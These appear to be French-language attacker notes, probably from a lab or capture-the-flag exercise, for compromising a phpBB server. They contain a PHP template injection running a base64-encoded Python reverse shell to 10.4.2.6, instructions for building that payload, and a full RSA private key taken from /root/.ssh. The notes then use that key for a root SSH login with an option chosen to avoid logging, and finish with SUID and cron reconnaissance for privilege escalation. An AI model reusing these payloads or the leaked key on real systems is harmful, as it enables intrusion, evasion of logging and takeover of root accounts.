1. Activer la modification des templates pour phpbb
2. Modifier une template rajouter 

<!-- PHP -->
shell_exec("echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuNC4yLjYiLDUzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d | /bin/bash");
<!-- ENDPHP -->

Pour faire le base64 :
reverse shell en python (il faut que python soit activé sur le serveur)

python -c 'import socket,subprocess,os;s=socket.sock(AF_INET,socket.SOCK_STREAM);s.connect((\"10.4.2.6(mon ip)\",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1; os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);' (ne pas oublier d'échapper les " avec \)

passer dans base64 sur une ligne (-w 0) => echo "command python" |base64 -w 0

On copie colle le base64 dans le shell_exec.


#####################""
Dans /root/.ssh/id_rsa => clé privé en clair

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA47fy6PafrUuKJfYQ884/cK9tGXbarpDhLLbjF+HoX0RSxjp5
Kzb0AGN0yktOXfT93oZY0/7IY5W0z6j5gW8aK6cYgFT04E7N7W+7seRyuEvTJ+td
1FLjWD0x7vJNqQCVfFWKwdpMr7a0wnVVxqzQRBuH0Zia9DsYDSr9m7b4JMCUpyjb
ZxLdHPLiOdKAG1eBqb6WMYV/iNsPhZtNR9AoZcoEmUXi9Hn1eo8o0fh5YbnZgCtW
V3I9pS76/mwWfseCSKgx8LvaqP7sdNRYyVfb0ughPowy7xxgYaxZ0ghRvTBxiy+n
COz+AbAEKEZsIYow1BoQ1OaGsIpVhaAgOGa95QIDAQABAoIBAG2+WPKs6Ic7wHhK
/iCBZVGJOarr/LfkWqCSAx+fX72Jz9p4k6yf7zfAtqhHYp0lVLPJS0Xfo/NaUqlB
Zf1a7eHbxZMTXnA7ikLDdlFlJ2RqJnk2lSGeULJVy5q8a3DnNyOUliqWah7Ejpio
s43r+vLX0bzRLtxFHnI6Jb7FjxEmVa3ZKw85N0K8KOVgP1IKt5ZBPNDvj7kRgjJ/
3DoaaWtl2CmmIAaoj3tEkyiP4/oOR3o38zVy2uSCuRAJwNZKY2rsO46iSYnfD4vU
ThferxVwi78ahCmYNsuhbOEhiZR5o2w1xG022aW/GKEILXzTj+Zs3ij+44epkba8
hMKDIAECgYEA+EbekXQ/BGuapS01paTdAr6B61MKfrFDX7/xCAoxaRMCro39c3ks
sysWttPCcx+bRMPASPkL5NQ21kCa5NefkxnWEC4GFR8LOhvG7DQ/M+MO9Lzxw1G8
pLCHTcNIvQwa3FOODSqRf1xt1ClTuqZN7OhRA1ebpD5YoFu3QARaNsECgYEA6s1d
ijRp+F5ymaHv0HVcEjv1tFGKj209dq2G4GTccwVctJbWwI+4+m7zh6x79AWJsGt/
sXFI58zWtEgKHnWGZYsHxPJzsfzIsb2oUYJRZu5LjBZuk1/upNYJ368uw7gPrtkE
Bwo6whwcEq+S3g2DOuRKLsVr+41ScTSwHCBF1CUCgYEA1+D/fChA9z39LKy/3fUZ
O16dJxqAoKLPu3zxPxVl20Btb4wFGpf9lxjbWkOM639LCiLPmmP6xJEF0YxBYsRe
e5DWgiESpuDkaTVn5VCUuDAxe/qimTwENItOSv6Hy+GvpW59sNMXyk97LCR3Km+a
iGmEr8xIiCqx81VsZJykOMECfzud6SIuLLnjQTXA6CMFqVr33mrqSUQheHmplZVk
BpUtx1wS8HP0CgOMKElKgi5zOYKRyNpE6T3xxJIBuJADRxyBMHfRF48Zn9uBTDtl
20VHO+dVyr2gnfc8YUVqNXV8Rn8emucusbyXZolYCvJWe/t3+13kwoYcW9JijlSV
3SUCgYEAjOkKyKl94A6REMiIgDjdujGVBT80+0ZbWSYGS/JbsbWWvQnyPIW3Ax+y
tjJqpMe2YZDEd2mqWE1tFUlbUHyzaHQ0NkUXIEV4B01IJZKQv82EfvVLK+4i9uwl
HcpSit88WZ8R17ebyECSzNePclsxtgvq5eEmt5hvg4TTA4my40Y=
-----END RSA PRIVATE KEY-----
on la met dans un fichier 

ensuite ssh -i clefacile.txt root@10.1.2.1 -T //l'option -T pour ne pas avoir de shell et donc pas de log

find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null


cat /etc/cron.d/sauvegardes 
ls -l /etc/cron.d/sauvegardes

